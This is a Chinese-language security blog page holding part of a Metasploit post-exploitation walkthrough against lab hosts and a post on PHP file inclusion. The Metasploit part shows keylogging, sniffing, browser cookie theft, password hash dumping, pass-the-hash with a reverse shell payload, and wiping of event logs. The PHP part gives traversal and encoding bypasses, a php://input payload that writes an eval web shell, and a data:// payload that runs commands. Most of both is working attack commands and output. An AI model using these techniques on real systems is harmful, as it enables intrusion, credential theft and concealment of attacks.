<p>以上两个模块都容易被杀毒软件检测到，实用性不强，可上传免杀处理后的远程控制工具。</p>
<h3 id="2-3-权限提升"><a href="#2-3-权限提升" class="headerlink" title="2.3 权限提升"></a><strong>2.3 权限提升</strong></h3><p>getsysytem  命令集成了四种权限提升技术</p>
<p>分别利用了MS09-012和MS10-015、MS10-073、MS10-092中的漏洞 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/post/windows/escalate# ls</span><br><span class="line">droplnk.rb  getsystem.rb  golden_ticket.rb  ms10_073_kbdlayout.rb  screen_unlock.rb  unmarshal_cmd_exec.rb</span><br></pre></td></tr></table></figure>



<h3 id="2-4-信息获取"><a href="#2-4-信息获取" class="headerlink" title="2.4 信息获取"></a><strong>2.4 信息获取</strong></h3><p><strong>dumplink模块：获取目标主机最近的系统操作、访问文件和office文档的操作记录</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/dumplinks </span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Running as SYSTEM extracting user list...</span><br><span class="line">[*] Extracting lnk files <span class="keyword">for</span> user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\<span class="number">01</span>.靶场夺旗第一关.pdf.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Chapter_1L.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\lab.txt.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\malware.lnk.</span><br></pre></td></tr></table></figure>



<p><strong>enum_applications模块：获取目标主机安装的软件、安全更新与漏洞补丁的信息</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications </span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on STU1</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2017 X86 Minimum Runtime - 14.16.27033     14.16.27033</span><br><span class="line"> Mozilla Firefox 69.0.1 (x86 zh-CN)                              69.0.1</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Notepad++ (32-bit x86)                                          7.7.1</span><br><span class="line"> Npcap 0.9983                                                    0.9983</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20200912201743_default_192.168.126.151_host.application_539875.txt</span><br></pre></td></tr></table></figure>

<p><strong>获取键盘记录，从start开始记录</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start </span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">&lt;Left Windows&gt;ist mimi&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop </span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure>



<h3 id="2-5-口令获取和利用"><a href="#2-5-口令获取和利用" class="headerlink" title="2.5 口令获取和利用"></a><strong>2.5 口令获取和利用</strong></h3><p><strong>通过网络嗅探获取，在post/windows/gather/credentials目录下有许多这一块的攻击模块</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer </span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces <span class="comment">#获取网卡</span></span><br><span class="line"><span class="number">1</span> - <span class="string">'WAN Miniport (Network Monitor)'</span> ( type:<span class="number">3</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"><span class="number">2</span> - <span class="string">'Intel(R) PRO/1000 MT Network Connection'</span> ( type:<span class="number">0</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_start <span class="number">1</span></span><br><span class="line">[*] Capture started on interface <span class="number">1</span> (<span class="number">50000</span> packet buffer)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_dump <span class="number">1</span> /root/xp1.cap <span class="comment">#保存在本地，再用wireshark分析</span></span><br><span class="line">[*] Flushing packet capture buffer <span class="keyword">for</span> interface <span class="number">1</span>...</span><br><span class="line">[*] Flushed <span class="number">0</span> packets (<span class="number">0</span> bytes)</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to /root/xp1.cap</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_stop <span class="number">1</span></span><br><span class="line">[*] Capture stopped on interface <span class="number">1</span></span><br><span class="line">[*] There are <span class="number">0</span> packets (<span class="number">0</span> bytes) remaining</span><br><span class="line">[*] Download or release them <span class="keyword">using</span> <span class="string">'sniffer_dump'</span> or <span class="string">'sniffer_release'</span></span><br></pre></td></tr></table></figure>

<p><strong>通过浏览器获取关键信息，如cookie、历史记录、密码等</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_ie </span><br><span class="line"></span><br><span class="line">[*] IE Version: <span class="number">8.0</span>.<span class="number">7601.17514</span></span><br><span class="line">[*] Retrieving history.....</span><br><span class="line">        File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat</span><br><span class="line">        File: </span><br><span class="line">[*] Looping through history to find autocomplete data....</span><br><span class="line">[-] No autocomplete entries found <span class="keyword">in</span> registry</span><br><span class="line">[*] Looking <span class="keyword">in</span> the Credential Store <span class="keyword">for</span> HTTP Authentication Creds...</span><br><span class="line">[*] Writing history to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.history_734619.txt</span><br><span class="line">[*] Writing cookies to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.cookies_282520.txt</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/smart_hashdump  <span class="comment">#获取系统口令的哈希值</span></span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one is connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /root/.msf4/loot/<span class="number">20200912210516</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_windows.hashes_975340.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key <span class="keyword">using</span> SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[*]     No users with password hints on this system</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     liukaifeng01:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>



<h3 id="2-6-内网拓展"><a href="#2-6-内网拓展" class="headerlink" title="2.6 内网拓展"></a><strong>2.6 内网拓展</strong></h3><p><strong>内网拓展功能，添加路由，将目标机器作为跳板机进入内网其它主机，有以下两种方式：</strong>                                                                                                                                                                                                                                                                                                                                                                                                                                   </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; route add <span class="number">192.168</span>.<span class="number">52.0</span> <span class="number">255.255</span>.<span class="number">255.0</span> <span class="number">3</span></span><br><span class="line">[*] Route added</span><br><span class="line">msf5 exploit(multi/handler) &gt; route print </span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">192.168</span>.<span class="number">52.0</span>       <span class="number">255.255</span>.<span class="number">255.0</span>      Session <span class="number">3</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp </span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set ports <span class="number">445</span></span><br><span class="line">ports =&gt; <span class="number">445</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned  <span class="number">13</span> of <span class="number">128</span> hosts (<span class="number">10</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned <span class="number">128</span> of <span class="number">128</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line"></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">meterpreter &gt; run autoroute <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[*] Adding a route to <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br></pre></td></tr></table></figure>



<p><strong>利用获取的口令进行传递攻击，如果密码一致，就可成功返回meterpreter会话：</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lport <span class="number">443</span></span><br><span class="line">lport =&gt; <span class="number">443</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBPass b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">SMBPass =&gt; b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">443</span> </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Connecting to the server...</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Authenticating to <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> as user <span class="string">''</span>...</span><br></pre></td></tr></table></figure>



<h3 id="2-7-掩踪灭迹"><a href="#2-7-掩踪灭迹" class="headerlink" title="2.7 掩踪灭迹"></a><strong>2.7 掩踪灭迹</strong></h3><p><strong>清除日志痕迹</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping <span class="number">1509</span> records from Application...</span><br><span class="line">[*] Wiping <span class="number">4759</span> records from System...</span><br><span class="line">[*] Wiping <span class="number">1453</span> records from Security...</span><br></pre></td></tr></table></figure>






      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-PHP安全" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/07/11/PHP%E5%AE%89%E5%85%A8/"
    >PHP安全</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/07/11/PHP%E5%AE%89%E5%85%A8/" class="article-date">
  <time datetime="2020-07-11T06:59:21.000Z" itemprop="datePublished">2020-07-11</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h2><h3 id="1-1-本地文件包含"><a href="#1-1-本地文件包含" class="headerlink" title="1.1 本地文件包含"></a><strong>1.1 本地文件包含</strong></h3><p><strong>../ 表示上一层目录，多../../../ 即可绕过前缀限制</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/desktop/chj# cd /root/tools/../../etc</span><br><span class="line">root@kali:/etc#</span><br></pre></td></tr></table></figure>

<p><strong>PHP内核是由C语言实现的，所以0字节(\x00)将作为字符串结束，web输入时转为urlencode变成%00</strong></p>
<p><strong>即输入?file=../../etc/passwd%00 实际包含文件会变成/etc/passwd</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'/home/run/'</span>.$file.<span class="string">'.php'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'/home/run'</span>.$file.<span class="string">'.php'</span>;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>但是通常情况下，网站管理员会禁止0字节，这时候可以利用其它技巧</strong></p>
<p><strong>原理：目录字符串在windows下256字节、linux下4096字节时会达到最大值，之后的字符将被丢弃</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd/././././././././././././abc</span><br><span class="line">/etc/passwd//////////////////abc</span><br><span class="line">/etc/passwd.........................  #点号截断适用于Windows系统</span><br></pre></td></tr></table></figure>

<p><strong>可以通过不同的编码方式来绕过一些服务器端逻辑：</strong></p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="left"><strong>url编码</strong></th>
<th align="left"><strong>二次编码</strong></th>
<th align="left">web容器编码</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>../</strong></td>
<td align="left"><strong>%2e%2e%2f <br>..%2f <br>%2e%2e/</strong></td>
<td align="left"><strong>%252e%252e%252f</strong></td>
<td align="left"><strong>..%c0%af</strong></td>
</tr>
<tr>
<td align="center"><strong>..\</strong></td>
<td align="left"><strong>%2e%2e%5c<br> ..%5c <br>%2e%2e</strong></td>
<td align="left"><strong>%252e%252e%255c</strong></td>
<td align="left"><strong>..%c1%9c</strong></td>
</tr>
<tr>
<td align="center"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>防护手段：配置open_basedir、避免包含动态变量，可以枚举出file的值</strong></p>
<p><strong>例如：open_basedir = /home/app/aaa  那么 /home/app/aaabbb 也是合法的</strong></p>
<p><strong>如果要限定目录，则设置为open_basedir = /home/app/aaa/ 即可</strong></p>
<p><strong>如果要配置多个目录的话在windows下用分号，linux下用冒号隔开</strong></p>
<h3 id="1-2-远程文件包含"><a href="#1-2-远程文件包含" class="headerlink" title="1.2 远程文件包含"></a><strong>1.2 远程文件包含</strong></h3><p><strong>漏洞利用条件：</strong></p>
<ul>
<li><strong>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</strong></li>
<li><strong>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</strong></li>
</ul>
<p><strong>测试代码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">     <span class="keyword">include</span>($filename.”.html”);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 问号绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt?</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ＃号绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt%23(#号要编码)</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 空格绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt%20(%20是空格的url编码)</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-本地文件包含的利用技巧"><a href="#1-3-本地文件包含的利用技巧" class="headerlink" title="1.3 本地文件包含的利用技巧"></a><strong>1.3 本地文件包含的利用技巧</strong></h3><p><strong>本地文件包含漏洞在某些条件下也可以执行PHP代码，以下是几种常见的技巧：</strong></p>
<p><strong>（1）包含用户上传的文件</strong></p>
<p><strong>如果用户上传的文件内容中包含了PHP代码，那么将被include（）加载后执行</strong></p>
<p><strong>（2）包含data://或php://input 等伪协议</strong></p>
<p><strong>（3）包含Session文件</strong></p>
<p><strong>（4）包含日志文件，如web server 的 access log</strong></p>
<p><strong>（5）包含上传的临时文件（RFC1867)</strong></p>
<p><strong>（6）包含/proc/self/environ 文件</strong></p>
<p><strong>（7）包含其它应用创建的文件，如数据库文件、缓存文件、应用日志等</strong></p>
<p><strong>下面着重分析下其中几种技巧的原理：</strong></p>
<p><strong>PHP伪协议：</strong></p>
<p><strong>PHP带了很多内置URL风格的封装协议，可用于fopen、copy、file_exists和filesize等文件系统函数。除了这些内置封装协议，还能通过stream_wrapper_register注册自定义的封装协议。这些协议都被称为伪协议。</strong></p>
<table>
<thead>
<tr>
<th align="center">php://   访问各个输入/输出流</th>
<th align="center"><strong>File:// ——访问本地文件系统</strong></th>
<th align="center"><strong>phar://  PHP归档</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>data://  读取数据(RFC2397)</strong></td>
<td align="center"><strong>ftp:// ——访问FTP(s)URLs</strong></td>
<td align="center"><strong>zlib://   压缩流</strong></td>
</tr>
<tr>
<td align="center"><strong>glob://  查找匹配的文件路径模式</strong></td>
<td align="center"><strong>http:// ——访问HTTP(s)网址</strong></td>
<td align="center"><strong>expect:// 处理交互式的流</strong></td>
</tr>
</tbody></table>
<h4 id="php-filter伪协议"><a href="#php-filter伪协议" class="headerlink" title="php://filter伪协议"></a><strong>php://filter伪协议</strong></h4><p>php://filter 是元封装器，设计用于数据流打开时的筛选过滤应用,对本地磁盘文件进行读写。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用php:filter读本地磁盘文件时不需要开启allow_url_fopen和allow_url_include</span></span><br><span class="line">(<span class="number">1</span>):filename=php:<span class="comment">//filter/read=convert.base64-encode/resource=xx.php</span></span><br><span class="line">(<span class="number">2</span>):filename=php:<span class="comment">//filter/convert.base64-encode/resource=xxx.php</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">  <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/2.php?filename=php://filter/read=convert.base64-encode/resource=2.php</span></span><br><span class="line">得到<span class="number">2.</span>php的base64编码</span><br><span class="line">    PD9waHANCiRmaWxlbmFtZT0kX0dFVFsnZmlsZW5hbWUnXTsNCmluY2x1ZGUoJGZpbGVuYW1lKTsNCj8+</span><br></pre></td></tr></table></figure>

<h4 id="php-input伪协议"><a href="#php-input伪协议" class="headerlink" title="php://input伪协议"></a><strong>php://input伪协议</strong></h4><p><strong>php://input可以访问请求的原始数据的只读流，即可以直接读取POST上没有经过解析的原始数据，但是使用enctype=”multipart/form-data”的时候php://input是无效的</strong></p>
<p><strong>代码例子：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞环境：需要开启allow_url_include=on</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#写入木马payload如下：</span></span><br><span class="line">URL: http:<span class="comment">//192.168.1.110/test.php?filename=php://input</span></span><br><span class="line">POST:<span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[xiaohua])&gt;'</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#执行命令POST部分</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>可以看到，成功在本地生成一个shell.php，并写入一句话木马</strong></p>
<p><strong><img src="/2020/07/11/PHP%E5%AE%89%E5%85%A8/1.png" alt></strong></p>
<h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a><strong>data://伪协议</strong></h4><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞环境</span></span><br><span class="line">allow_url_include=on</span><br><span class="line">allow_url_fopen=on </span><br><span class="line"><span class="comment">#data://text/plain;base64,xxxx(base64编码后的数据)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/2.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"dir"</span>)<span class="meta">?&gt;</span>编码为PD9waHAgc3lzdGVtKCJkaXIiKT8+</span><br><span class="line">注意这里+需要url编码为%<span class="number">2</span>b才可以运行</span><br></pre></td></tr></table></figure>

<p>成功执行dir命令</p>
